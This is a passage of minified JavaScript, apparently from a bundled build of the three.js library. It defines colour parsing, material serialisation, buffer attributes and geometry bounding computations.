4381203,papayawhip:16773077,peachpuff:16767673,peru:13468991,pink:16761035,plum:14524637,powderblue:11591910,purple:8388736,rebeccapurple:6697881,red:16711680,rosybrown:12357519,royalblue:4286945,saddlebrown:9127187,salmon:16416882,sandybrown:16032864,seagreen:3050327,seashell:16774638,sienna:10506797,silver:12632256,skyblue:8900331,slateblue:6970061,slategray:7372944,slategrey:7372944,snow:16775930,springgreen:65407,steelblue:4620980,tan:13808780,teal:32896,thistle:14204888,tomato:16737095,turquoise:4251856,violet:15631086,wheat:16113331,white:16777215,whitesmoke:16119285,yellow:16776960,yellowgreen:10145074},Bi={h:0,s:0,l:0},Lo={h:0,s:0,l:0};function tu(t,e,n){return n<0&&(n+=1),n>1&&(n-=1),n<1/6?t+(e-t)*6*n:n<1/2?e:n<2/3?t+(e-t)*6*(2/3-n):t}class je{constructor(e,n,i){return this.isColor=!0,this.r=1,this.g=1,this.b=1,this.set(e,n,i)}set(e,n,i){if(n===void 0&&i===void 0){const s=e;s&&s.isColor?this.copy(s):typeof s=="number"?this.setHex(s):typeof s=="string"&&this.setStyle(s)}else this.setRGB(e,n,i);return this}setScalar(e){return this.r=e,this.g=e,this.b=e,this}setHex(e,n=Cn){return e=Math.floor(e),this.r=(e>>16&255)/255,this.g=(e>>8&255)/255,this.b=(e&255)/255,We.colorSpaceToWorking(this,n),this}setRGB(e,n,i,s=We.workingColorSpace){return this.r=e,this.g=n,this.b=i,We.colorSpaceToWorking(this,s),this}setHSL(e,n,i,s=We.workingColorSpace){if(e=hw(e,1),n=He(n,0,1),i=He(i,0,1),n===0)this.r=this.g=this.b=i;else{const r=i<=.5?i*(1+n):i+n-i*n,a=2*i-r;this.r=tu(a,r,e+1/3),this.g=tu(a,r,e),this.b=tu(a,r,e-1/3)}return We.colorSpaceToWorking(this,s),this}setStyle(e,n=Cn){function i(r){r!==void 0&&parseFloat(r)<1&&Ie("Color: Alpha component of "+e+" will be ignored.")}let s;if(s=/^(\w+)\(([^\)]*)\)/.exec(e)){let r;const a=s[1],o=s[2];switch(a){case"rgb":case"rgba":if(r=/^\s*(\d+)\s*,\s*(\d+)\s*,\s*(\d+)\s*(?:,\s*(\d*\.?\d+)\s*)?$/.exec(o))return i(r[4]),this.setRGB(Math.min(255,parseInt(r[1],10))/255,Math.min(255,parseInt(r[2],10))/255,Math.min(255,parseInt(r[3],10))/255,n);if(r=/^\s*(\d+)\%\s*,\s*(\d+)\%\s*,\s*(\d+)\%\s*(?:,\s*(\d*\.?\d+)\s*)?$/.exec(o))return i(r[4]),this.setRGB(Math.min(100,parseInt(r[1],10))/100,Math.min(100,parseInt(r[2],10))/100,Math.min(100,parseInt(r[3],10))/100,n);break;case"hsl":case"hsla":if(r=/^\s*(\d*\.?\d+)\s*,\s*(\d*\.?\d+)\%\s*,\s*(\d*\.?\d+)\%\s*(?:,\s*(\d*\.?\d+)\s*)?$/.exec(o))return i(r[4]),this.setHSL(parseFloat(r[1])/360,parseFloat(r[2])/100,parseFloat(r[3])/100,n);break;default:Ie("Color: Unknown color model "+e)}}else if(s=/^\#([A-Fa-f\d]+)$/.exec(e)){const r=s[1],a=r.length;if(a===3)return this.setRGB(parseInt(r.charAt(0),16)/15,parseInt(r.charAt(1),16)/15,parseInt(r.charAt(2),16)/15,n);if(a===6)return this.setHex(parseInt(r,16),n);Ie("Color: Invalid hex color "+e)}else if(e&&e.length>0)return this.setColorName(e,n);return this}setColorName(e,n=Cn){const i=H0[e.toLowerCase()];return i!==void 0?this.setHex(i,n):Ie("Color: Unknown color "+e),this}clone(){return new this.constructor(this.r,this.g,this.b)}copy(e){return this.r=e.r,this.g=e.g,this.b=e.b,this}copySRGBToLinear(e){return this.r=Ti(e.r),this.g=Ti(e.g),this.b=Ti(e.b),this}copyLinearToSRGB(e){return this.r=Er(e.r),this.g=Er(e.g),this.b=Er(e.b),this}convertSRGBToLinear(){return this.copySRGBToLinear(this),this}convertLinearToSRGB(){return this.copyLinearToSRGB(this),this}getHex(e=Cn){return We.workingToColorSpace(jt.copy(this),e),Math.round(He(jt.r*255,0,255))*65536+Math.round(He(jt.g*255,0,255))*256+Math.round(He(jt.b*255,0,255))}getHexString(e=Cn){return("000000"+this.getHex(e).toString(16)).slice(-6)}getHSL(e,n=We.workingColorSpace){We.workingToColorSpace(jt.copy(this),n);const i=jt.r,s=jt.g,r=jt.b,a=Math.max(i,s,r),o=Math.min(i,s,r);let l,c;const p=(o+a)/2;if(o===a)l=0,c=0;else{const d=a-o;switch(c=p<=.5?d/(a+o):d/(2-a-o),a){case i:l=(s-r)/d+(s<r?6:0);break;case s:l=(r-i)/d+2;break;case r:l=(i-s)/d+4;break}l/=6}return e.h=l,e.s=c,e.l=p,e}getRGB(e,n=We.workingColorSpace){return We.workingToColorSpace(jt.copy(this),n),e.r=jt.r,e.g=jt.g,e.b=jt.b,e}getStyle(e=Cn){We.workingToColorSpace(jt.copy(this),e);const n=jt.r,i=jt.g,s=jt.b;return e!==Cn?`color(${e} ${n.toFixed(3)} ${i.toFixed(3)} ${s.toFixed(3)})`:`rgb(${Math.round(n*255)},${Math.round(i*255)},${Math.round(s*255)})`}offsetHSL(e,n,i){return this.getHSL(Bi),this.setHSL(Bi.h+e,Bi.s+n,Bi.l+i)}add(e){return this.r+=e.r,this.g+=e.g,this.b+=e.b,this}addColors(e,n){return this.r=e.r+n.r,this.g=e.g+n.g,this.b=e.b+n.b,this}addScalar(e){return this.r+=e,this.g+=e,this.b+=e,this}sub(e){return this.r=Math.max(0,this.r-e.r),this.g=Math.max(0,this.g-e.g),this.b=Math.max(0,this.b-e.b),this}multiply(e){return this.r*=e.r,this.g*=e.g,this.b*=e.b,this}multiplyScalar(e){return this.r*=e,this.g*=e,this.b*=e,this}lerp(e,n){return this.r+=(e.r-this.r)*n,this.g+=(e.g-this.g)*n,this.b+=(e.b-this.b)*n,this}lerpColors(e,n,i){return this.r=e.r+(n.r-e.r)*i,this.g=e.g+(n.g-e.g)*i,this.b=e.b+(n.b-e.b)*i,this}lerpHSL(e,n){this.getHSL(Bi),e.getHSL(Lo);const i=Oc(Bi.h,Lo.h,n),s=Oc(Bi.s,Lo.s,n),r=Oc(Bi.l,Lo.l,n);return this.setHSL(i,s,r),this}setFromVector3(e){return this.r=e.x,this.g=e.y,this.b=e.z,this}applyMatrix3(e){const n=this.r,i=this.g,s=this.b,r=e.elements;return this.r=r[0]*n+r[3]*i+r[6]*s,this.g=r[1]*n+r[4]*i+r[7]*s,this.b=r[2]*n+r[5]*i+r[8]*s,this}equals(e){return e.r===this.r&&e.g===this.g&&e.b===this.b}fromArray(e,n=0){return this.r=e[n],this.g=e[n+1],this.b=e[n+2],this}toArray(e=[],n=0){return e[n]=this.r,e[n+1]=this.g,e[n+2]=this.b,e}fromBufferAttribute(e,n){return this.r=e.getX(n),this.g=e.getY(n),this.b=e.getZ(n),this}toJSON(){return this.getHex()}*[Symbol.iterator](){yield this.r,yield this.g,yield this.b}}const jt=new je;je.NAMES=H0;let Cw=0;class no extends Vr{constructor(){super(),this.isMaterial=!0,Object.defineProperty(this,"id",{value:Cw++}),this.uuid=Qa(),this.name="",this.type="Material",this.blending=wr,this.side=ls,this.vertexColors=!1,this.opacity=1,this.transparent=!1,this.alphaHash=!1,this.blendSrc=cd,this.blendDst=ud,this.blendEquation=Es,this.blendSrcAlpha=null,this.blendDstAlpha=null,this.blendEquationAlpha=null,this.blendColor=new je(0,0,0),this.blendAlpha=0,this.depthFunc=Lr,this.depthTest=!0,this.depthWrite=!0,this.stencilWriteMask=255,this.stencilFunc=Kf,this.stencilRef=0,this.stencilFuncMask=255,this.stencilFail=Ws,this.stencilZFail=Ws,this.stencilZPass=Ws,this.stencilWrite=!1,this.clippingPlanes=null,this.clipIntersection=!1,this.clipShadows=!1,this.shadowSide=null,this.colorWrite=!0,this.precision=null,this.polygonOffset=!1,this.polygonOffsetFactor=0,this.polygonOffsetUnits=0,this.dithering=!1,this.alphaToCoverage=!1,this.premultipliedAlpha=!1,this.forceSinglePass=!1,this.allowOverride=!0,this.visible=!0,this.toneMapped=!0,this.userData={},this.version=0,this._alphaTest=0}get alphaTest(){return this._alphaTest}set alphaTest(e){this._alphaTest>0!=e>0&&this.version++,this._alphaTest=e}onBeforeRender(){}onBeforeCompile(){}customProgramCacheKey(){return this.onBeforeCompile.toString()}setValues(e){if(e!==void 0)for(const n in e){const i=e[n];if(i===void 0){Ie(`Material: parameter '${n}' has value of undefined.`);continue}const s=this[n];if(s===void 0){Ie(`Material: '${n}' is not a property of THREE.${this.type}.`);continue}s&&s.isColor?s.set(i):s&&s.isVector3&&i&&i.isVector3?s.copy(i):this[n]=i}}toJSON(e){const n=e===void 0||typeof e=="string";n&&(e={textures:{},images:{}});const i={metadata:{version:4.7,type:"Material",generator:"Material.toJSON"}};i.uuid=this.uuid,i.type=this.type,this.name!==""&&(i.name=this.name),this.color&&this.color.isColor&&(i.color=this.color.getHex()),this.roughness!==void 0&&(i.roughness=this.roughness),this.metalness!==void 0&&(i.metalness=this.metalness),this.sheen!==void 0&&(i.sheen=this.sheen),this.sheenColor&&this.sheenColor.isColor&&(i.sheenColor=this.sheenColor.getHex()),this.sheenRoughness!==void 0&&(i.sheenRoughness=this.sheenRoughness),this.emissive&&this.emissive.isColor&&(i.emissive=this.emissive.getHex()),this.emissiveIntensity!==void 0&&this.emissiveIntensity!==1&&(i.emissiveIntensity=this.emissiveIntensity),this.specular&&this.specular.isColor&&(i.specular=this.specular.getHex()),this.specularIntensity!==void 0&&(i.specularIntensity=this.specularIntensity),this.specularColor&&this.specularColor.isColor&&(i.specularColor=this.specularColor.getHex()),this.shininess!==void 0&&(i.shininess=this.shininess),this.clearcoat!==void 0&&(i.clearcoat=this.clearcoat),this.clearcoatRoughness!==void 0&&(i.clearcoatRoughness=this.clearcoatRoughness),this.clearcoatMap&&this.clearcoatMap.isTexture&&(i.clearcoatMap=this.clearcoatMap.toJSON(e).uuid),this.clearcoatRoughnessMap&&this.clearcoatRoughnessMap.isTexture&&(i.clearcoatRoughnessMap=this.clearcoatRoughnessMap.toJSON(e).uuid),this.clearcoatNormalMap&&this.clearcoatNormalMap.isTexture&&(i.clearcoatNormalMap=this.clearcoatNormalMap.toJSON(e).uuid,i.clearcoatNormalScale=this.clearcoatNormalScale.toArray()),this.sheenColorMap&&this.sheenColorMap.isTexture&&(i.sheenColorMap=this.sheenColorMap.toJSON(e).uuid),this.sheenRoughnessMap&&this.sheenRoughnessMap.isTexture&&(i.sheenRoughnessMap=this.sheenRoughnessMap.toJSON(e).uuid),this.dispersion!==void 0&&(i.dispersion=this.dispersion),this.iridescence!==void 0&&(i.iridescence=this.iridescence),this.iridescenceIOR!==void 0&&(i.iridescenceIOR=this.iridescenceIOR),this.iridescenceThicknessRange!==void 0&&(i.iridescenceThicknessRange=this.iridescenceThicknessRange),this.iridescenceMap&&this.iridescenceMap.isTexture&&(i.iridescenceMap=this.iridescenceMap.toJSON(e).uuid),this.iridescenceThicknessMap&&this.iridescenceThicknessMap.isTexture&&(i.iridescenceThicknessMap=this.iridescenceThicknessMap.toJSON(e).uuid),this.anisotropy!==void 0&&(i.anisotropy=this.anisotropy),this.anisotropyRotation!==void 0&&(i.anisotropyRotation=this.anisotropyRotation),this.anisotropyMap&&this.anisotropyMap.isTexture&&(i.anisotropyMap=this.anisotropyMap.toJSON(e).uuid),this.map&&this.map.isTexture&&(i.map=this.map.toJSON(e).uuid),this.matcap&&this.matcap.isTexture&&(i.matcap=this.matcap.toJSON(e).uuid),this.alphaMap&&this.alphaMap.isTexture&&(i.alphaMap=this.alphaMap.toJSON(e).uuid),this.lightMap&&this.lightMap.isTexture&&(i.lightMap=this.lightMap.toJSON(e).uuid,i.lightMapIntensity=this.lightMapIntensity),this.aoMap&&this.aoMap.isTexture&&(i.aoMap=this.aoMap.toJSON(e).uuid,i.aoMapIntensity=this.aoMapIntensity),this.bumpMap&&this.bumpMap.isTexture&&(i.bumpMap=this.bumpMap.toJSON(e).uuid,i.bumpScale=this.bumpScale),this.normalMap&&this.normalMap.isTexture&&(i.normalMap=this.normalMap.toJSON(e).uuid,i.normalMapType=this.normalMapType,i.normalScale=this.normalScale.toArray()),this.displacementMap&&this.displacementMap.isTexture&&(i.displacementMap=this.displacementMap.toJSON(e).uuid,i.displacementScale=this.displacementScale,i.displacementBias=this.displacementBias),this.roughnessMap&&this.roughnessMap.isTexture&&(i.roughnessMap=this.roughnessMap.toJSON(e).uuid),this.metalnessMap&&this.metalnessMap.isTexture&&(i.metalnessMap=this.metalnessMap.toJSON(e).uuid),this.emissiveMap&&this.emissiveMap.isTexture&&(i.emissiveMap=this.emissiveMap.toJSON(e).uuid),this.specularMap&&this.specularMap.isTexture&&(i.specularMap=this.specularMap.toJSON(e).uuid),this.specularIntensityMap&&this.specularIntensityMap.isTexture&&(i.specularIntensityMap=this.specularIntensityMap.toJSON(e).uuid),this.specularColorMap&&this.specularColorMap.isTexture&&(i.specularColorMap=this.specularColorMap.toJSON(e).uuid),this.envMap&&this.envMap.isTexture&&(i.envMap=this.envMap.toJSON(e).uuid,this.combine!==void 0&&(i.combine=this.combine)),this.envMapRotation!==void 0&&(i.envMapRotation=this.envMapRotation.toArray()),this.envMapIntensity!==void 0&&(i.envMapIntensity=this.envMapIntensity),this.reflectivity!==void 0&&(i.reflectivity=this.reflectivity),this.refractionRatio!==void 0&&(i.refractionRatio=this.refractionRatio),this.gradientMap&&this.gradientMap.isTexture&&(i.gradientMap=this.gradientMap.toJSON(e).uuid),this.transmission!==void 0&&(i.transmission=this.transmission),this.transmissionMap&&this.transmissionMap.isTexture&&(i.transmissionMap=this.transmissionMap.toJSON(e).uuid),this.thickness!==void 0&&(i.thickness=this.thickness),this.thicknessMap&&this.thicknessMap.isTexture&&(i.thicknessMap=this.thicknessMap.toJSON(e).uuid),this.attenuationDistance!==void 0&&this.attenuationDistance!==1/0&&(i.attenuationDistance=this.attenuationDistance),this.attenuationColor!==void 0&&(i.attenuationColor=this.attenuationColor.getHex()),this.size!==void 0&&(i.size=this.size),this.shadowSide!==null&&(i.shadowSide=this.shadowSide),this.sizeAttenuation!==void 0&&(i.sizeAttenuation=this.sizeAttenuation),this.blending!==wr&&(i.blending=this.blending),this.side!==ls&&(i.side=this.side),this.vertexColors===!0&&(i.vertexColors=!0),this.opacity<1&&(i.opacity=this.opacity),this.transparent===!0&&(i.transparent=!0),this.blendSrc!==cd&&(i.blendSrc=this.blendSrc),this.blendDst!==ud&&(i.blendDst=this.blendDst),this.blendEquation!==Es&&(i.blendEquation=this.blendEquation),this.blendSrcAlpha!==null&&(i.blendSrcAlpha=this.blendSrcAlpha),this.blendDstAlpha!==null&&(i.blendDstAlpha=this.blendDstAlpha),this.blendEquationAlpha!==null&&(i.blendEquationAlpha=this.blendEquationAlpha),this.blendColor&&this.blendColor.isColor&&(i.blendColor=this.blendColor.getHex()),this.blendAlpha!==0&&(i.blendAlpha=this.blendAlpha),this.depthFunc!==Lr&&(i.depthFunc=this.depthFunc),this.depthTest===!1&&(i.depthTest=this.depthTest),this.depthWrite===!1&&(i.depthWrite=this.depthWrite),this.colorWrite===!1&&(i.colorWrite=this.colorWrite),this.stencilWriteMask!==255&&(i.stencilWriteMask=this.stencilWriteMask),this.stencilFunc!==Kf&&(i.stencilFunc=this.stencilFunc),this.stencilRef!==0&&(i.stencilRef=this.stencilRef),this.stencilFuncMask!==255&&(i.stencilFuncMask=this.stencilFuncMask),this.stencilFail!==Ws&&(i.stencilFail=this.stencilFail),this.stencilZFail!==Ws&&(i.stencilZFail=this.stencilZFail),this.stencilZPass!==Ws&&(i.stencilZPass=this.stencilZPass),this.stencilWrite===!0&&(i.stencilWrite=this.stencilWrite),this.rotation!==void 0&&this.rotation!==0&&(i.rotation=this.rotation),this.polygonOffset===!0&&(i.polygonOffset=!0),this.polygonOffsetFactor!==0&&(i.polygonOffsetFactor=this.polygonOffsetFactor),this.polygonOffsetUnits!==0&&(i.polygonOffsetUnits=this.polygonOffsetUnits),this.linewidth!==void 0&&this.linewidth!==1&&(i.linewidth=this.linewidth),this.dashSize!==void 0&&(i.dashSize=this.dashSize),this.gapSize!==void 0&&(i.gapSize=this.gapSize),this.scale!==void 0&&(i.scale=this.scale),this.dithering===!0&&(i.dithering=!0),this.alphaTest>0&&(i.alphaTest=this.alphaTest),this.alphaHash===!0&&(i.alphaHash=!0),this.alphaToCoverage===!0&&(i.alphaToCoverage=!0),this.premultipliedAlpha===!0&&(i.premultipliedAlpha=!0),this.forceSinglePass===!0&&(i.forceSinglePass=!0),this.allowOverride===!1&&(i.allowOverride=!1),this.wireframe===!0&&(i.wireframe=!0),this.wireframeLinewidth>1&&(i.wireframeLinewidth=this.wireframeLinewidth),this.wireframeLinecap!=="round"&&(i.wireframeLinecap=this.wireframeLinecap),this.wireframeLinejoin!=="round"&&(i.wireframeLinejoin=this.wireframeLinejoin),this.flatShading===!0&&(i.flatShading=!0),this.visible===!1&&(i.visible=!1),this.toneMapped===!1&&(i.toneMapped=!1),this.fog===!1&&(i.fog=!1),Object.keys(this.userData).length>0&&(i.userData=this.userData);function s(r){const a=[];for(const o in r){const l=r[o];delete l.metadata,a.push(l)}return a}if(n){const r=s(e.textures),a=s(e.images);r.length>0&&(i.textures=r),a.length>0&&(i.images=a)}return i}clone(){return new this.constructor().copy(this)}copy(e){this.name=e.name,this.blending=e.blending,this.side=e.side,this.vertexColors=e.vertexColors,this.opacity=e.opacity,this.transparent=e.transparent,this.blendSrc=e.blendSrc,this.blendDst=e.blendDst,this.blendEquation=e.blendEquation,this.blendSrcAlpha=e.blendSrcAlpha,this.blendDstAlpha=e.blendDstAlpha,this.blendEquationAlpha=e.blendEquationAlpha,this.blendColor.copy(e.blendColor),this.blendAlpha=e.blendAlpha,this.depthFunc=e.depthFunc,this.depthTest=e.depthTest,this.depthWrite=e.depthWrite,this.stencilWriteMask=e.stencilWriteMask,this.stencilFunc=e.stencilFunc,this.stencilRef=e.stencilRef,this.stencilFuncMask=e.stencilFuncMask,this.stencilFail=e.stencilFail,this.stencilZFail=e.stencilZFail,this.stencilZPass=e.stencilZPass,this.stencilWrite=e.stencilWrite;const n=e.clippingPlanes;let i=null;if(n!==null){const s=n.length;i=new Array(s);for(let r=0;r!==s;++r)i[r]=n[r].clone()}return this.clippingPlanes=i,this.clipIntersection=e.clipIntersection,this.clipShadows=e.clipShadows,this.shadowSide=e.shadowSide,this.colorWrite=e.colorWrite,this.precision=e.precision,this.polygonOffset=e.polygonOffset,this.polygonOffsetFactor=e.polygonOffsetFactor,this.polygonOffsetUnits=e.polygonOffsetUnits,this.dithering=e.dithering,this.alphaTest=e.alphaTest,this.alphaHash=e.alphaHash,this.alphaToCoverage=e.alphaToCoverage,this.premultipliedAlpha=e.premultipliedAlpha,this.forceSinglePass=e.forceSinglePass,this.allowOverride=e.allowOverride,this.visible=e.visible,this.toneMapped=e.toneMapped,this.userData=JSON.parse(JSON.stringify(e.userData)),this}dispose(){this.dispatchEvent({type:"dispose"})}set needsUpdate(e){e===!0&&this.version++}}class uh extends no{constructor(e){super(),this.isMeshBasicMaterial=!0,this.type="MeshBasicMaterial",this.color=new je(16777215),this.map=null,this.lightMap=null,this.lightMapIntensity=1,this.aoMap=null,this.aoMapIntensity=1,this.specularMap=null,this.alphaMap=null,this.envMap=null,this.envMapRotation=new ui,this.combine=b0,this.reflectivity=1,this.refractionRatio=.98,this.wireframe=!1,this.wireframeLinewidth=1,this.wireframeLinecap="round",this.wireframeLinejoin="round",this.fog=!0,this.setValues(e)}copy(e){return super.copy(e),this.color.copy(e.color),this.map=e.map,this.lightMap=e.lightMap,this.lightMapIntensity=e.lightMapIntensity,this.aoMap=e.aoMap,this.aoMapIntensity=e.aoMapIntensity,this.specularMap=e.specularMap,this.alphaMap=e.alphaMap,this.envMap=e.envMap,this.envMapRotation.copy(e.envMapRotation),this.combine=e.combine,this.reflectivity=e.reflectivity,this.refractionRatio=e.refractionRatio,this.wireframe=e.wireframe,this.wireframeLinewidth=e.wireframeLinewidth,this.wireframeLinecap=e.wireframeLinecap,this.wireframeLinejoin=e.wireframeLinejoin,this.fog=e.fog,this}}const Tt=new H,No=new Ze;let Rw=0;class li{constructor(e,n,i=!1){if(Array.isArray(e))throw new TypeError("THREE.BufferAttribute: array should be a Typed Array.");this.isBufferAttribute=!0,Object.defineProperty(this,"id",{value:Rw++}),this.name="",this.array=e,this.itemSize=n,this.count=e!==void 0?e.length/n:0,this.normalized=i,this.usage=Zf,this.updateRanges=[],this.gpuType=ni,this.version=0}onUploadCallback(){}set needsUpdate(e){e===!0&&this.version++}setUsage(e){return this.usage=e,this}addUpdateRange(e,n){this.updateRanges.push({start:e,count:n})}clearUpdateRanges(){this.updateRanges.length=0}copy(e){return this.name=e.name,this.array=new e.array.constructor(e.array),this.itemSize=e.itemSize,this.count=e.count,this.normalized=e.normalized,this.usage=e.usage,this.gpuType=e.gpuType,this}copyAt(e,n,i){e*=this.itemSize,i*=n.itemSize;for(let s=0,r=this.itemSize;s<r;s++)this.array[e+s]=n.array[i+s];return this}copyArray(e){return this.array.set(e),this}applyMatrix3(e){if(this.itemSize===2)for(let n=0,i=this.count;n<i;n++)No.fromBufferAttribute(this,n),No.applyMatrix3(e),this.setXY(n,No.x,No.y);else if(this.itemSize===3)for(let n=0,i=this.count;n<i;n++)Tt.fromBufferAttribute(this,n),Tt.applyMatrix3(e),this.setXYZ(n,Tt.x,Tt.y,Tt.z);return this}applyMatrix4(e){for(let n=0,i=this.count;n<i;n++)Tt.fromBufferAttribute(this,n),Tt.applyMatrix4(e),this.setXYZ(n,Tt.x,Tt.y,Tt.z);return this}applyNormalMatrix(e){for(let n=0,i=this.count;n<i;n++)Tt.fromBufferAttribute(this,n),Tt.applyNormalMatrix(e),this.setXYZ(n,Tt.x,Tt.y,Tt.z);return this}transformDirection(e){for(let n=0,i=this.count;n<i;n++)Tt.fromBufferAttribute(this,n),Tt.transformDirection(e),this.setXYZ(n,Tt.x,Tt.y,Tt.z);return this}set(e,n=0){return this.array.set(e,n),this}getComponent(e,n){let i=this.array[e*this.itemSize+n];return this.normalized&&(i=Jr(i,this.array)),i}setComponent(e,n,i){return this.normalized&&(i=on(i,this.array)),this.array[e*this.itemSize+n]=i,this}getX(e){let n=this.array[e*this.itemSize];return this.normalized&&(n=Jr(n,this.array)),n}setX(e,n){return this.normalized&&(n=on(n,this.array)),this.array[e*this.itemSize]=n,this}getY(e){let n=this.array[e*this.itemSize+1];return this.normalized&&(n=Jr(n,this.array)),n}setY(e,n){return this.normalized&&(n=on(n,this.array)),this.array[e*this.itemSize+1]=n,this}getZ(e){let n=this.array[e*this.itemSize+2];return this.normalized&&(n=Jr(n,this.array)),n}setZ(e,n){return this.normalized&&(n=on(n,this.array)),this.array[e*this.itemSize+2]=n,this}getW(e){let n=this.array[e*this.itemSize+3];return this.normalized&&(n=Jr(n,this.array)),n}setW(e,n){return this.normalized&&(n=on(n,this.array)),this.array[e*this.itemSize+3]=n,this}setXY(e,n,i){return e*=this.itemSize,this.normalized&&(n=on(n,this.array),i=on(i,this.array)),this.array[e+0]=n,this.array[e+1]=i,this}setXYZ(e,n,i,s){return e*=this.itemSize,this.normalized&&(n=on(n,this.array),i=on(i,this.array),s=on(s,this.array)),this.array[e+0]=n,this.array[e+1]=i,this.array[e+2]=s,this}setXYZW(e,n,i,s,r){return e*=this.itemSize,this.normalized&&(n=on(n,this.array),i=on(i,this.array),s=on(s,this.array),r=on(r,this.array)),this.array[e+0]=n,this.array[e+1]=i,this.array[e+2]=s,this.array[e+3]=r,this}onUpload(e){return this.onUploadCallback=e,this}clone(){return new this.constructor(this.array,this.itemSize).copy(this)}toJSON(){const e={itemSize:this.itemSize,type:this.array.constructor.name,array:Array.from(this.array),normalized:this.normalized};return this.name!==""&&(e.name=this.name),this.usage!==Zf&&(e.usage=this.usage),e}}class G0 extends li{constructor(e,n,i){super(new Uint16Array(e),n,i)}}class W0 extends li{constructor(e,n,i){super(new Uint32Array(e),n,i)}}class tn extends li{constructor(e,n,i){super(new Float32Array(e),n,i)}}let Pw=0;const An=new bt,nu=new $t,er=new H,vn=new to,na=new to,It=new H;class $n extends Vr{constructor(){super(),this.isBufferGeometry=!0,Object.defineProperty(this,"id",{value:Pw++}),this.uuid=Qa(),this.name="",this.type="BufferGeometry",this.index=null,this.indirect=null,this.indirectOffset=0,this.attributes={},this.morphAttributes={},this.morphTargetsRelative=!1,this.groups=[],this.boundingBox=null,this.boundingSphere=null,this.drawRange={start:0,count:1/0},this.userData={}}getIndex(){return this.index}setIndex(e){return Array.isArray(e)?this.index=new(B0(e)?W0:G0)(e,1):this.index=e,this}setIndirect(e,n=0){return this.indirect=e,this.indirectOffset=n,this}getIndirect(){return this.indirect}getAttribute(e){return this.attributes[e]}setAttribute(e,n){return this.attributes[e]=n,this}deleteAttribute(e){return delete this.attributes[e],this}hasAttribute(e){return this.attributes[e]!==void 0}addGroup(e,n,i=0){this.groups.push({start:e,count:n,materialIndex:i})}clearGroups(){this.groups=[]}setDrawRange(e,n){this.drawRange.start=e,this.drawRange.count=n}applyMatrix4(e){const n=this.attributes.position;n!==void 0&&(n.applyMatrix4(e),n.needsUpdate=!0);const i=this.attributes.normal;if(i!==void 0){const r=new Ue().getNormalMatrix(e);i.applyNormalMatrix(r),i.needsUpdate=!0}const s=this.attributes.tangent;return s!==void 0&&(s.transformDirection(e),s.needsUpdate=!0),this.boundingBox!==null&&this.computeBoundingBox(),this.boundingSphere!==null&&this.computeBoundingSphere(),this}applyQuaternion(e){return An.makeRotationFromQuaternion(e),this.applyMatrix4(An),this}rotateX(e){return An.makeRotationX(e),this.applyMatrix4(An),this}rotateY(e){return An.makeRotationY(e),this.applyMatrix4(An),this}rotateZ(e){return An.makeRotationZ(e),this.applyMatrix4(An),this}translate(e,n,i){return An.makeTranslation(e,n,i),this.applyMatrix4(An),this}scale(e,n,i){return An.makeScale(e,n,i),this.applyMatrix4(An),this}lookAt(e){return nu.lookAt(e),nu.updateMatrix(),this.applyMatrix4(nu.matrix),this}center(){return this.computeBoundingBox(),this.boundingBox.getCenter(er).negate(),this.translate(er.x,er.y,er.z),this}setFromPoints(e){const n=this.getAttribute("position");if(n===void 0){const i=[];for(let s=0,r=e.length;s<r;s++){const a=e[s];i.push(a.x,a.y,a.z||0)}this.setAttribute("position",new tn(i,3))}else{const i=Math.min(e.length,n.count);for(let s=0;s<i;s++){const r=e[s];n.setXYZ(s,r.x,r.y,r.z||0)}e.length>n.count&&Ie("BufferGeometry: Buffer size too small for points data. Use .dispose() and create a new geometry."),n.needsUpdate=!0}return this}computeBoundingBox(){this.boundingBox===null&&(this.boundingBox=new to);const e=this.attributes.position,n=this.morphAttributes.position;if(e&&e.isGLBufferAttribute){$e("BufferGeometry.computeBoundingBox(): GLBufferAttribute requires a manual bounding box.",this),this.boundingBox.set(new H(-1/0,-1/0,-1/0),new H(1/0,1/0,1/0));return}if(e!==void 0){if(this.boundingBox.setFromBufferAttribute(e),n)for(let i=0,s=n.length;i<s;i++){const r=n[i];vn.setFromBufferAttribute(r),this.morphTargetsRelative?(It.addVectors(this.boundingBox.min,vn.min),this.boundingBox.expandByPoint(It),It.addVectors(this.boundingBox.max,vn.max),this.boundingBox.expandByPoint(It)):(this.boundingBox.expandByPoint(vn.min),this.boundingBox.expandByPoint(vn.max))}}else this.boundingBox.makeEmpty();(isNaN(this.boundingBox.min.x)||isNaN(this.boundingBox.min.y)||isNaN(this.boundingBox.min.z))&&$e('BufferGeometry.computeBoundingBox(): Computed min/max have NaN values. The "position" attribute is likely to have NaN values.',this)}computeBoundingSphere(){this.boundingSphere===null&&(this.boundingSphere=new ch);const e=this.attributes.position,n=this.morphAttributes.position;if(e&&e.isGLBufferAttribute){$e("BufferGeometry.computeBoundingSphere(): GLBufferAttribute requires a manual bounding sphere.",this),this.boundingSphere.set(new H,1/0);return}if(e){const i=this.boundingSphere.center;if(vn.setFromBufferAttribute(e),n)for(let r=0,a=n.length;r<a;r++){const o=n[r];na.setFromBufferAttribute(o),this.morphTargetsRelative?(It.addVectors(vn.min,na.min),vn.expandByPoint(It),It.addVectors(vn.max,na.max),vn.expandByPoint(It)):(vn.expandByPoint(na.min),vn.expandByPoint(na.max))}vn.getCenter(i);let s=0;for(let r=0,a=e.count;r<a;r++)It.fromBufferAttribute(e,r),s=Math.max(s,i.distanceToSquared(It));if(n)for(let r=0,a=n.length;r<a;r++){const o=n[r],l=this.morphTargetsRelative;for(let c=0,p=o.count;c<p;c++)It.fromBufferAttribute(o,c),l&&(er.fromBufferAttribute(e,c),It.add(er)),s=Math.max(s,i.distanceToSquared(It))}this.boundingSphere.radius=Math.sqrt(s),isNaN(this.boundingSphere.radius)&&$e('BufferGeometry.computeBoundingSphere(): Computed radius is NaN. The "position" attribute is likely to have NaN values.',this)}}computeTangents(){const e=this.index,n=this.attributes;if(e===null||n.position===void 0||n.normal===void 0||n.uv===void 0){$e("BufferGeometry: .computeTangents() failed. Missing required attributes (index, position, normal or uv)");return}const i=n.position,s=n.normal,r=n.uv;this.hasAttribute("tangent")===!1&&this.setAttribute("tangent",new li(new Float32Array(4*i.count),4));const a=this.getAttribute("tangent"),o=[],l=[];for(let L=0;L<i.count;L++)o[L]=new H,l[L]=new H;const c=new H,p=new H,d=new H,h=new Ze,f=new Ze,v=new Ze,y=new H,m=new H;function u(L,w,E){c.fromBufferAttribute(i,L),p.fromBufferAttribute(i,w),d.fromBufferAttribute(i,E),h.fromBufferAttribute(r,L),f.fromBufferAttribute(r,w),v.fromBufferAttribute(r,E),p.sub(c),d.sub(c),f.sub(h),v.sub(h);const 